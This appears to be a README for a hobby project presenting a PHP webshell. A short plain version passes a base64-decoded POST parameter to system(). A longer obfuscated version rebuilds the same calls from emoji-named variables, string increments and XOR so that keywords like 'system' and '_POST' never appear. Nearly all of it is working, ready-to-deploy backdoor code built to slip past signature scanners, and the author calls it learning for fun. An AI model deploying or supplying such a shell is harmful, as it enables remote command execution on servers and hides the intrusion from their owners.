# php-emoji-webshell

🥸 Nothing new about this webshell, just use same techniques like XOR and self increment operations.

Basically this code
```php
<?php

$a = $_POST[4] ? base64_decode($_POST[4]) : 'whoami';
@system($a);

```
Turn into emoji, self increment and XOR operations.

```php
<?php

$_=[];
$_=@"$_";
$__=("_"=="_")+("_"=="_");
$_=@$_[++$__];

$🌏=$_++;
$🤮=$_++;
$🍪=$_++;
$🫣=$_++;
$🧁=$_++;
$🎂=$_++;
$🥃=$_++;
$🍔=$_++;
$🌘=$_++;
$🌗=$_++;
$🌖=$_++;
$🌕=$_++;
$🌒=$_++;
$🌓=$_++;
$🌔=$_++;
$🌰=$_++;
$🍘=$_++;
$🥗=$_++;
$🥥=$_++;
$🍑=$_++;
$🍋=$_++;
$🧇=$_++;
$🌮=$_++;
$🍕=$_++;
$🥯=$_++;
$🍣=$_;

$__++;
$__++;
$__++;
$👿=$🤮.$🌏.$🥥.$🧁.$__;
$__--;
$__--;
$👿.=$__.("#"^"|").$🫣.$🧁.$🍪.$🌔.$🫣.$🧁;

$💀=$🥥.$🥯.$🥥.$🍑.$🧁.$🌒;
$🥳=("#"^"|").($🥥^"#").($🌕^"#").($🌰^"#").($🌮^"#"); 
$🤯=@${$🥳}[$__] ? $👿(@${$🥳}[$__]) : $🌮.$🍔.$🌔.$🌏.$🌒.$🌘;
@$💀($🤯);

```

Im just building this for fun and for the sake of learning new things. ☕️🥯
